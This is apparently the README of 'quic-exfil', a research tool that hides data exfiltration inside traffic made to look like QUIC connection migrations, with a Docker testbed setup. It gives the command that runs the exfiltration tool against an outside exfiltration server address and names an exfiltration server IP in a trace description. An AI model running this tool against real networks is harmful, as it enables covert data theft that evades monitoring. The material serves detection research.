# quic-exfil
Covert data exfiltration by mimicking QUIC server-side connection migrations.

![Rust build workflow](https://github.com/thomasgruebl/quic-exfil/blob/main/.github/workflows/rust.yml/badge.svg)
![Crates.io](https://img.shields.io/crates/d/quic-exfil?style=plastic)
![Libraries.io dependency status for GitHub repo](https://img.shields.io/librariesio/github/thomasgruebl/quic-exfil?style=plastic)
![GitHub last commit](https://img.shields.io/github/last-commit/thomasgruebl/quic-exfil?style=plastic)
![GitHub](https://img.shields.io/github/license/thomasgruebl/quic-exfil?style=plastic)
<a style="text-decoration: none" href="https://github.com/thomasgruebl/quic-exfil/stargazers">
<img src="https://img.shields.io/github/stars/thomasgruebl/quic-exfil.svg?style=plastic" alt="Stars">
</a>
<a style="text-decoration: none" href="https://github.com/thomasgruebl/quic-exfil/fork">
<img src="https://img.shields.io/github/forks/thomasgruebl/quic-exfil.svg?style=plastic" alt="Forks">
</a>
<a style="text-decoration: none" href="https://github.com/thomasgruebl/quic-exfil/issues">
<img src="https://img.shields.io/github/issues/thomasgruebl/quic-exfil.svg?style=plastic" alt="Issues">
</a>



Add descr on how to install quiche on the base machine -> and start quiche server to listen for benign connection migrations 
./target/release/quiche-server --listen 192.168.100.63:4433 --root html --cert apps/src/bin/cert.crt --key apps/src/bin/cert.key --enable-active-migration


QUIC-exfiltration client-side Wireshark trace (without the required server-side acknowledgments)
* 2a05:d012:8ef:f66:12d3:23ac:6791:a11f is the exfiltration server IP
* Packet 54622 mimics the PATH_CHALLENGE packet

![Alt text](sample_pcap.png "pcap_sample")


## Dependencies

libpcap

Debian/Ubuntu:

```sh
sudo apt install libpcap-dev
```

macOS:

```sh
brew install libpcap
```




## Experimental Testbed

This section describes the experimental setup used to evaluate `quicexfil` in a Docker-based testbed. The testbed aims to simulate a small enterprise network with multiple desktop machines generating QUIC traffic, and controlled benign connection migrations using Cloudflare's `quiche` library.

Docker compose spins up 16 containers running the `quicexfil` binary. Each container is based on [`accetto/xubuntu-vnc-novnc-firefox`](https://hub.docker.com/r/accetto/xubuntu-vnc-novnc-firefox) for a lightweight desktop GUI with Firefox and noVNC support.

Launch the setup:

```sh
docker compose up --build
```

This will build the image and launch 16 instances of the quicexfil container.

You will see console output showing accessible noVNC URLs (e.g. https://172.19.0.8:6901) for each container. These can be opened in your host browser (preferably Firefox) to interact with each container’s desktop environment.

You can connect to each container using the noVNC lite clients, for example:

```sh
https://172.19.0.8:6901
```

Log in with the default password <i>headless</i> and open Firefox in each container to manually generate QUIC traffic (e.g., by visiting sites like Cloudflare or Google).

Running the benign QUIC Server on the Host VM:

The base virtual machine (host) runs the quiche server to listen for and accept QUIC connections (including active migrations):

```sh
./target/release/quiche-server \
  --listen 192.168.100.63:4433 \
  --root html \
  --cert apps/src/bin/cert.crt \
  --key apps/src/bin/cert.key \
  --enable-active-migration
```

Replace <i>192.168.100.63</i> with the IP address of your host machine.

Connect to each container using

```sh
docker exec -it <container_id> bash
```

and then start the benign quiche connection migration script (make sure to adjust the IP address of your quiche server within the [script](https://github.com/thomasgruebl/quic-exfil/blob/main/scripts/benign_conn_migr.sh)):

```sh
./benign_conn_migr.sh
```

In 4 of the 16 containers, the experimental quicexfil tool is manually run to test potential data exfiltration over QUIC:

```sh
./target/release/quic-exfiltration -d "192.0.2.100" -i "eth0"
```

Replace <i>192.0.2.100</i> with the IP address of your exfiltration server.